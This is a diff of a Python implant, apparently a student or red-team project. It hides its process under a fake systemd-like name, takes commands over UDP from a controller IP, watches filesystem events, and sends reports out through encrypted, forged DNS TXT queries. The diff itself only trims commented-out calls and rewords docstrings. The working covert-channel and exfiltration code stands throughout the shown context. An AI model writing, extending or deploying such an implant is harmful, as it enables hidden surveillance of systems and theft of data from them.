@@ -98,29 +98,21 @@ def on_any_event_directories(event):
     if event.is_directory:
         if event.event_type == "created":
             forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Created: {event.src_path}\n", MONITOR_IDENTIFICATION)
-            # send_dns_query(query)
         if event.event_type == "deleted":
             forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Deleted: {event.src_path}\n", MONITOR_IDENTIFICATION)
-            # send_dns_query(query)
         if event.event_type == "modified":
             forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Modified: {event.src_path}\n", MONITOR_IDENTIFICATION)
-            # send_dns_query(query)
         if event.event_type == "moved":
             forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - Directory Moved: {event.src_path} --> {event.dest_path}\n", MONITOR_IDENTIFICATION)
-            # send_dns_query(query)
     else:
         if event.event_type == "created":
             forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Created: {event.src_path}\n", MONITOR_IDENTIFICATION)
-            # send_dns_query(query)
         if event.event_type == "deleted":
             forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Deleted: {event.src_path}\n", MONITOR_IDENTIFICATION)
-            # send_dns_query(query)
         if event.event_type == "modified":
             forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Modified: {event.src_path}\n", MONITOR_IDENTIFICATION)
-            # send_dns_query(query)
         if event.event_type == "moved":
             forge_dns_query_block(f"{datetime.now().strftime('%I:%M%p on %B %d, %Y')} - File Moved: {event.src_path} --> {event.dest_path}\n", MONITOR_IDENTIFICATION)
-            # send_dns_query(query)
 
 class FileSystemMonitor():
 
@@ -219,14 +211,14 @@ def receive_udp_command(pkt):
 
 def send_dns_query(query):
     """
-        Send dns query.
+        Send dns query. This is kind of a useless function.
     """
     send(query, verbose=0)
 
 
 def forge_dns_query_stream(data: str, indentification: int):
     """
-        Forge dns query.
+        Forge dns query using the stream cipher.
     """
     hostname = get_random_hostname()
     encrypted_data = b""
@@ -244,7 +236,7 @@ def forge_dns_query_stream(data: str, indentification: int):
 
 def forge_dns_query_block(data: str, indentification: int):
     """
-        Forge dns query.
+        Forge dns query using a block cipher.
     """
     hostname = get_random_hostname()
     encrypted_data = b""
@@ -263,7 +255,6 @@ def forge_dns_query_block(data: str, indentification: int):
         encrypted_data = BLOCK_ENCRYPTION_HANDLER.encrypt(data.encode("utf-8"))
         query = IP(dst=CONTROLLER_IP, id=indentification)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=hostname), ar=DNSRR(type="TXT", ttl=4, rrname=hostname, rdlen=len(encrypted_data)+1, rdata=encrypted_data))
         send(query, verbose=0)
-    # return query
 
 
 def execute_watch_command(path: str) -> bool:
@@ -298,3 +289,4 @@ MONITOR = FileSystemMonitor()
 if __name__ == "__main__":
     hide_process_name("systemd-userwork-evil")
     sniff(filter=f"ip src host {CONTROLLER_IP} and not port ssh and udp and not icmp", iface=f"{NETWORK_INTERFACE}", prn=packet_handler)
+
